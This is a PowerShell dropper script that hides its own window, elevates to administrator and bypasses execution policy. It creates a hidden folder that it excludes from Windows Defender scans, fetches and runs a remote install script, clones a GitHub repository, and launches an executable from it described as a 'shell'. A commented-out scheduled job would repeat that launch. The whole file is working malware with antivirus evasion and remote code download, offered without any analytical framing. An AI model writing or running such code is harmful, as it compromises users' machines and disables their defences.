Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
function Hide-Console
{
    $consolePtr = [Console.Window]::GetConsoleWindow()
    [Console.Window]::ShowWindow($consolePtr, 0)
}

function RunAdminAndBypass
{
	if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    		Start-Process PowerShell -Verb RunAs "-NoProfile -ExecutionPolicy Bypass -Command `"cd '$pwd'; & '$PSCommandPath';`"";
   		exit;
	}
	Set-ExecutionPolicy -ExecutionPolicy Bypass -Force
}

function DownloadExeShellAndExcludeFromScan
{
	New-Item -Path "C:\Windows\" -Name "Win" -ItemType "directory"
	Add-MpPreference -ExclusionPath "C:\Windows\Win"
	attrib +h C:\Windows\Win
	cd C:\Windows\Win
	Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
	choco install -y git
	& 'C:\Program Files\Git\cmd\git.exe' clone https://github.com/RuthIsRoot/script.git 
	
}

function ExecuteShell
{
	Expand-Archive "C:\Windows\Win\script\fibonacci.zip" -DestinationPath "C:\Windows\Win\script\"
	Start-Process -FilePath "C:\Windows\Win\script\fibonacci.exe"
}

function TriggerExecution
{
	# Take a look on this
	
	# $trigger = New-JobTrigger `
	# -Once `
	# -At (Get-Date) `
	# -RepetitionInterval (New-TimeSpan -Minutes 1) `
	# -RepetitionDuration ([System.TimeSpan]::MaxValue)
	
	# Register-ScheduledJob -Name Test -FilePath C:\Users\34601\Desktop\test.ps1 -Trigger $trigger
}

Hide-Console
RunAdminAndBypass
DownloadExeShellAndExcludeFromScan
ExecuteShell
# TriggerExecution
